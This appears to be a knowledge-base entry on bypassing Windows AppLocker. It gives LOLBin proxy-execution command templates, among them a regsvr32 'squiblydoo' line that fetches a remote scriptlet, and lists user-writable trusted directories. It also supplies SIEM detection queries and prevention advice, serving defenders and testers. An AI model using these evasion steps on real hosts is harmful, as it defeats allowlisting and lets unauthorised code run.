name: AppLocker Bypass via Trusted LOLBins and Writable Paths
description: AppLocker allowlisting is bypassed by proxying execution through Microsoft-signed binaries (LOLBins) that are trusted by default rules, or by dropping payloads into default-allowed writable directories. Classic vectors: rundll32, regsvr32 scriptlet (squiblydoo), InstallUtil, MSBuild inline tasks, and writing under C:\Windows\Tasks or C:\Windows\System32\spool\drivers\color - paths users can write to that the default rules still permit.
source: LOLBAS Project; MITRE ATT&CK T1218; Microsoft AppLocker docs
notes:
=== WHY DEFAULT RULES LEAK ===
  The default AppLocker rule set trusts everything under %WINDIR% and %PROGRAMFILES%. Several
  subdirectories of %WINDIR% are USER-WRITABLE, so a non-admin can place a payload in a trusted path.

=== DEFAULT-ALLOWED WRITABLE PATHS (user-writable, still trusted) ===
  C:\Windows\Tasks
  C:\Windows\Temp (varies)
  C:\Windows\System32\spool\drivers\color
  C:\Windows\tracing

=== SIGNED-BINARY PROXY (LOLBins) ===
  rundll32.exe <dll>,<entrypoint>              # proxy a DLL export
  regsvr32 /s /u /i:<url> scrobj.dll           # squiblydoo - scriptlet execution (T1218.010)
  InstallUtil.exe /logfile= /LogToConsole=false /U <assembly>   # T1218.004 run managed code
  MSBuild.exe <project.xml>                    # inline task runs C# (T1127)

=== ENUMERATE POLICY FIRST ===
  Get-AppLockerPolicy -Effective -Xml
  Get-AppLockerPolicy -Effective | Select -Expand RuleCollections
  # note which collections are Enforced vs AuditOnly; DLL rules are often not enabled

=== ALTERNATIVES ===
  AMSI/CLM bypass (if PowerShell is in Constrained Language Mode), HTA/mshta, signed-binary chains.

examples.label: MSBuild inline-task execution (no compiler needed on disk)

references.title: MITRE ATT&CK T1218 - System Binary Proxy Execution

recommended.note: DLL search-order abuse is another way to run inside a trusted process.
InstallUtil/MSBuild proxy managed code; in-memory CLR loading is the next step.
AppLocker bypass is part of the broader evasion picture.

defense.why_it_works: AppLocker trusts binaries by path, publisher, or hash. Microsoft-signed LOLBins pass publisher rules while proxying arbitrary code, and default path rules trust %WINDIR% subtrees that non-admins can write to. DLL enforcement is a separate, often-disabled collection, so rundll32-style proxies run even where EXE rules are enforced.
defense.prerequisites: A standard user session on a host with AppLocker in default or incomplete configuration. No admin needed for LOLBin proxying or writing to a user-writable trusted path.
defense.impact: T1218 System Binary Proxy Execution. Arbitrary code runs under a trusted, signed process, defeating allowlisting and often blending into normal admin tooling.
defense.detection: Alert on LOLBins spawning unusual children or with network/scriptlet arguments: regsvr32 with /i: and a URL (squiblydoo), rundll32 loading a DLL from a user-writable path, InstallUtil/MSBuild launched by Office or a shell, and any process image written under C:\Windows\Tasks or spool\drivers\color. Script-block logging and EDR command-line capture are key.
defense.artifacts: Security 4688 / Sysmon EID 1 process creation with LOLBin command lines; Sysmon EID 11 (FileCreate) under writable %WINDIR% paths; Sysmon EID 7 image loads from unusual directories; AppLocker 8003/8004 (audit/block) events in Microsoft-Windows-AppLocker.
defense.splunk_spl:
index=wineventlog (EventCode=4688 OR source="*Sysmon*" EventCode=1)
| search (New_Process_Name="*regsvr32.exe" CommandLine="*/i:*http*") OR (New_Process_Name="*rundll32.exe" CommandLine="*\\Windows\\Tasks\\*") OR New_Process_Name IN ("*InstallUtil.exe","*MSBuild.exe")
| table _time, Computer, ParentImage, New_Process_Name, CommandLine
defense.elastic_kql: process.name:(regsvr32.exe or rundll32.exe or InstallUtil.exe or MSBuild.exe) and process.command_line:(*\/i\:http* or *\\Windows\\Tasks\\* or *scrobj.dll*)
defense.sentinel_kql:
DeviceProcessEvents
| where FileName in~ ("regsvr32.exe","rundll32.exe","installutil.exe","msbuild.exe")
| where ProcessCommandLine has_any ("/i:http","scrobj.dll","\\Windows\\Tasks\\","spool\\drivers\\color")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
defense.prevention: Enable the DLL rule collection and switch all collections to Enforce; add explicit deny/path rules for the user-writable %WINDIR% directories (Tasks, tracing, spool\drivers\color); block or constrain regsvr32/rundll32/InstallUtil/MSBuild with WDAC; enable Microsoft ASR rules (block Office child processes, block executable content); prefer WDAC over AppLocker for stronger signer-based control.

detections.name: Squiblydoo - regsvr32 remote scriptlet
detections.logic:
DeviceProcessEvents
| where FileName =~ "regsvr32.exe"
| where ProcessCommandLine has "scrobj.dll" and ProcessCommandLine has_any ("/i:http","/i:\\\\")
| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine
detections.false_positives: Rare legitimate COM registration from a network path

detections.name: LOLBin executing from a user-writable trusted path
detections.logic:
index=sysmon EventCode=1 (Image="*rundll32.exe" OR Image="*regsvr32.exe") CommandLine IN ("*\\Windows\\Tasks\\*","*spool\\drivers\\color*","*\\Windows\\tracing*")
| table _time, Computer, ParentImage, Image, CommandLine
detections.false_positives: Uncommon; printer color-profile tooling may touch the color directory
detections.tuning: Baseline legitimate writers of those directories
